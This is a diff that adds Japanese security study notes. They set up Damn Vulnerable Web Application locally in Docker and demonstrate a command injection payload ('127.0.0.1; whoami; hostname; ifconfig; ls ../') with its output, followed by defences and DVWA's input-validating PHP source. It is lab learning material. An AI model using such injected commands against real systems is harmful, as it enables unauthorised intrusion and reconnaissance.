@@ -45,5 +45,104 @@
     - 対処法
       - CSRFを防ぐためにトークンを使用して、リクエストを認証することが推奨されています。また、CSRF対策を検証するために、CSRFテストツールを使用することも可能です。また、リクエストを検証するために、referrer情報を使用することも可能
 
-
 [MDN/Types_of_attacks](https://developer.mozilla.org/ja/docs/Web/Security/Types_of_attacks)
+
+## 課題2
+
+## 課題3
+### Damn Vulnerable Web Application の環境を立ち上げる
+```
+$ docker pull vulnerables/web-dvwa
+$ docker run --rm -it -p 80:80 vulnerables/web-dvwa
+
+## 開発環境のパス
+http://127.0.0.1/login.php
+
+username: admin, password: password
+```
+
+### コマンドインジェクション
+#### 攻撃手法
+```shell
+## enter an IP Address
+$ 127.0.0.1; whoami; hostname; ifconfig; ls ../
+
+## response
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.055 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.104 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.127 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.103 ms
+
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.055/0.097/0.127/0.026 ms
+www-data
+d6bbe7e5c894
+brute
+captcha
+csp
+csrf
+exec
+fi
+javascript
+sqli
+sqli_blind
+upload
+view_help.php
+view_source.php
+view_source_all.php
+weak_id
+xss_d
+xss_r
+xss_s
+```
+
+#### 有効な防御手段
+- トークンを検証する
+- `stripslashes` でコマンドの無効化など
+  - `127.0.0.1; whoami;` →　`;` を無効化する 
+<details>
+<summary>コマンドインジェクションを防御するソース</summary>
+
+```php
+<?php
+if( isset( $_POST[ 'Submit' ]  ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $target = $_REQUEST[ 'ip' ];
+    $target = stripslashes( $target );
+
+    // Split the IP into 4 octects
+    $octet = explode( ".", $target );
+
+    // Check IF each octet is an integer
+    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
+        // If all 4 octets are int's put the IP back together.
+        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+        // Determine OS and execute the ping command.
+        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+            // Windows
+            $cmd = shell_exec( 'ping  ' . $target );
+        }
+        else {
+            // *nix
+            $cmd = shell_exec( 'ping  -c 4 ' . $target );
+        }
+
+        // Feedback for the end user
+        echo "<pre>{$cmd}</pre>";
+    }
+    else {
+        // Ops. Let the user name theres a mistake
+        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+```
+</details>
